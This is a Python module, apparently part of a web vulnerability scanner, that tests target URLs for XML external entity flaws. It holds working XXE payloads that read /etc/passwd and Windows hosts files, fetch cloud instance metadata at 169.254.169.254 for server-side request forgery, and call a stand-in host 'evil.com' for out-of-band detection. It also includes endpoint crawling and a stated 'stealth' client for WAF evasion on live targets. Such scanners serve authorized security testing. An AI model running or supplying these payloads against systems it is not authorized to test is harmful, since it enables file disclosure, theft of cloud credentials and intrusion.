#!/usr/bin/env python3
"""XXE (XML External Entity) Validator Module

Tests for XXE vulnerabilities:
- External entity injection
- Out-of-band data exfiltration via callbacks
- Local file inclusion
- SSRF via XXE

Uses stealth HTTP client for WAF evasion on live targets.
"""

import json
import os
import time
from typing import Dict, Any, List, Optional
from urllib.parse import urlparse

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    import requests
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)


def test_xxe_oob(target_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test XXE with out-of-band callback
    
    Args:
        target_url: Target URL that accepts XML
        callback_url: Callback URL for OOB detection
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "xxe",
        "test": "xxe_oob",
        "vulnerable": False,
        "url": target_url,
        "evidence": None,
        "target_url": target_url
    }
    
    if not callback_url:
        callback_url = "http://evil.com/xxe"
    
    # XXE payload with external entity
    xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "{callback_url}">
]>
<foo>&xxe;</foo>"""
    
    # Method 1: Try POST with form data (common pattern for web forms)
    try:
        resp = safe_post(target_url, data={"xml": xxe_payload}, timeout=10)
        if "evil.com" in resp.text or callback_url in resp.text:
            result["vulnerable"] = True
            result["evidence"] = {
                "response_snippet": resp.text[:500],
                "status_code": resp.status_code,
                "method": "POST_FORM",
                "note": "XXE entity reference returned in response (form data)"
            }
            return result
    except Exception:
        pass
    
    # Method 2: Try POST with raw XML content-type
    headers = {"Content-Type": "application/xml"}
    try:
        resp = safe_post(target_url, data=xxe_payload, headers=headers, timeout=10)
        if "evil.com" in resp.text or callback_url in resp.text:
            result["vulnerable"] = True
            result["evidence"] = {
                "response_snippet": resp.text[:500],
                "status_code": resp.status_code,
                "method": "POST_XML",
                "note": "XXE entity reference returned in response"
            }
            return result
    except Exception:
        pass
    
    # Method 3: Try other content types
    for content_type in ["text/xml", "application/xml; charset=utf-8"]:
        if result["vulnerable"]:
            break
        try:
            headers = {"Content-Type": content_type}
            resp = safe_post(target_url, data=xxe_payload, headers=headers, timeout=10)
            if "evil.com" in resp.text or callback_url in resp.text:
                result["vulnerable"] = True
                result["evidence"] = {
                    "response_snippet": resp.text[:500],
                    "status_code": resp.status_code,
                    "content_type": content_type,
                    "method": "POST_XML",
                    "note": "XXE entity reference returned in response"
                }
        except Exception:
            pass
    
    return result


def test_xxe_file_inclusion(target_url: str) -> Dict[str, Any]:
    """Test XXE for local file inclusion
    
    Args:
        target_url: Target URL that accepts XML
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "xxe",
        "test": "xxe_file_inclusion",
        "vulnerable": False,
        "url": target_url,
        "evidence": None,
        "target_url": target_url
    }
    
    # Test common file inclusion paths
    file_paths = [
        "/etc/passwd",
        "/etc/hosts",
        "file:///etc/passwd",
        "file:///C:/Windows/System32/drivers/etc/hosts",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]
    
    for file_path in file_paths:
        xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "{file_path}">
]>
<foo>&xxe;</foo>"""
        
        # Method 1: Try POST with form data
        try:
            resp = safe_post(target_url, data={"xml": xxe_payload}, timeout=10)
            content = resp.text.lower()
            
            indicators = ["root:", "localhost", "127.0.0.1", "bin/bash"]
            if any(ind in content for ind in indicators):
                result["vulnerable"] = True
                result["evidence"] = {
                    "file_path": file_path,
                    "response_snippet": resp.text[:500],
                    "status_code": resp.status_code,
                    "method": "POST_FORM",
                    "note": "File content detected in response (form data)"
                }
                return result
        except Exception:
            pass
        
        # Method 2: Try POST with raw XML
        headers = {"Content-Type": "application/xml"}
        try:
            resp = safe_post(target_url, data=xxe_payload, headers=headers, timeout=10)
            content = resp.text.lower()
            
            # Check for file content indicators
            indicators = ["root:", "localhost", "127.0.0.1", "bin/bash"]
            if any(ind in content for ind in indicators):
                result["vulnerable"] = True
                result["evidence"] = {
                    "file_path": file_path,
                    "response_snippet": resp.text[:500],
                    "status_code": resp.status_code,
                    "method": "POST_XML",
                    "note": "File content detected in response"
                }
                return result
        except Exception:
            pass
    
    return result


def test_xxe_ssrf(target_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test XXE for SSRF (Server-Side Request Forgery)
    
    Args:
        target_url: Target URL that accepts XML
        callback_url: Callback URL for OOB detection
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "xxe",
        "test": "xxe_ssrf",
        "vulnerable": False,
        "url": target_url,
        "evidence": None,
        "target_url": target_url
    }
    
    if not callback_url:
        callback_url = "http://169.254.169.254/latest/meta-data/"
    
    # XXE payload with internal endpoint
    xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "{callback_url}">
]>
<foo>&xxe;</foo>"""
    
    headers = {"Content-Type": "application/xml"}
    try:
        resp = safe_post(target_url, data=xxe_payload, headers=headers, timeout=10)
        content = resp.text.lower()
        
        # Check for SSRF indicators
        ssrf_indicators = ["ami-id", "instance-id", "169.254.169.254", "metadata"]
        if any(ind in content for ind in ssrf_indicators):
            result["vulnerable"] = True
            result["evidence"] = {
                "callback_url": callback_url,
                "response_snippet": resp.text[:500],
                "status_code": resp.status_code,
                "note": "SSRF via XXE detected"
            }
    except Exception:
        pass
    
    return result


def discover_xxe_endpoints(base_url: str) -> List[str]:
    """Discover endpoints that might accept XML
    
    Args:
        base_url: Base URL
        
    Returns:
        List of potential XXE endpoints
    """
    endpoints = [base_url]
    
    # Common XXE-prone endpoints
    common_endpoints = [
        "/parse", "/xml", "/api/xml", "/upload",
        "/import", "/feed", "/rss", "/soap",
        "/api/import", "/data", "/submit",
        "/api/parse", "/xmlparser", "/xmlrpc",
    ]
    
    for ep in common_endpoints:
        endpoints.append(f"{base_url.rstrip('/')}{ep}")
    
    # Try to crawl for XML-related links
    try:
        resp = safe_get(base_url, timeout=10)
        if resp.status_code == 200:
            import re
            # Find all href links
            hrefs = re.findall(r'href=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
            for href in hrefs:
                if any(kw in href.lower() for kw in ["xml", "parse", "upload", "import", "feed"]):
                    if href.startswith("/"):
                        endpoints.append(f"{base_url.rstrip('/')}{href}")
                    elif href.startswith(base_url):
                        endpoints.append(href)
            
            # Find form actions
            actions = re.findall(r'action=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
            for action in actions:
                if action.startswith("/"):
                    endpoints.append(f"{base_url.rstrip('/')}{action}")
    except Exception:
        pass
    
    return list(set(endpoints))


def validate_xxe(discovery_data: Dict[str, Any], callback_server_url: Optional[str] = None) -> Dict[str, Any]:
    """Main validation function for XXE
    
    Args:
        discovery_data: Discovery data containing target URLs
        callback_server_url: Optional callback server URL for OOB detection
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Extract XML endpoints from discovery data
    target = discovery_data.get("target")
    if not target:
        return results
    
    # Initialize callback correlator if callback server is configured
    correlator = None
    job_id = None
    callback_url = None
    
    if callback_server_url:
        try:
            from tools.callback_correlator import CallbackCorrelator
            correlator = CallbackCorrelator(callback_server_url)
            job_id = f"xxe_{int(time.time())}"
            token = correlator.register_job(job_id, "xxe", target, timeout=300)
            callback_url = correlator.get_callback_url(token)
            print(f"[XXE] Callback enabled: {callback_url}")
        except Exception as e:
            print(f"[XXE] Callback setup failed: {e}, continuing without callbacks")
            callback_server_url = None
    
    # Discover XXE endpoints
    endpoints_to_test = discover_xxe_endpoints(target)
    print(f"[XXE] Testing {len(endpoints_to_test)} endpoints")
    
    # Test each endpoint
    for endpoint_url in endpoints_to_test:
        # Test OOB XXE
        oob_result = test_xxe_oob(endpoint_url, callback_url)
        results["tests_run"] += 1
        if oob_result["vulnerable"]:
            results["vulnerable"] = True
            results["findings"].append(oob_result)
            continue  # Found vuln on this endpoint, move to next
        
        # Test file inclusion
        file_result = test_xxe_file_inclusion(endpoint_url)
        results["tests_run"] += 1
        if file_result["vulnerable"]:
            results["vulnerable"] = True
            results["findings"].append(file_result)
            continue  # Found vuln on this endpoint, move to next
        
        # Test SSRF via XXE
        ssrf_result = test_xxe_ssrf(endpoint_url, callback_url)
        results["tests_run"] += 1
        if ssrf_result["vulnerable"]:
            results["vulnerable"] = True
            results["findings"].append(ssrf_result)
    
    # Poll for callback hits if callback enabled
    if callback_server_url and correlator:
        print(f"[XXE] Polling for callback hits (job_id: {job_id})...")
        time.sleep(5)  # Wait for potential callback
        hits = correlator.poll_hits(job_id, timeout=60, interval=2)
        if hits:
            print(f"[XXE] Received {len(hits)} callback hit(s)")
            for hit in hits:
                results["findings"].append({
                    "type": "xxe_callback_confirmed",
                    "test": "xxe_oob_callback",
                    "vulnerable": True,
                    "confidence": "high",
                    "callback_evidence": {
                        "remote_addr": hit.get("remote_addr"),
                        "user_agent": hit.get("user_agent"),
                        "method": hit.get("method"),
                        "path": hit.get("path"),
                        "query_params": hit.get("query_params"),
                        "timestamp": hit.get("timestamp"),
                    },
                    "note": "XXE confirmed via out-of-band callback"
                })
                results["vulnerable"] = True
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="XXE Validator")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--callback-server-url", help="Callback server URL")
    args = ap.parse_args()
    
    discovery_data = {"target": args.target}
    results = validate_xxe(discovery_data, args.callback_server_url)
    
    print(json.dumps(results, indent=2))

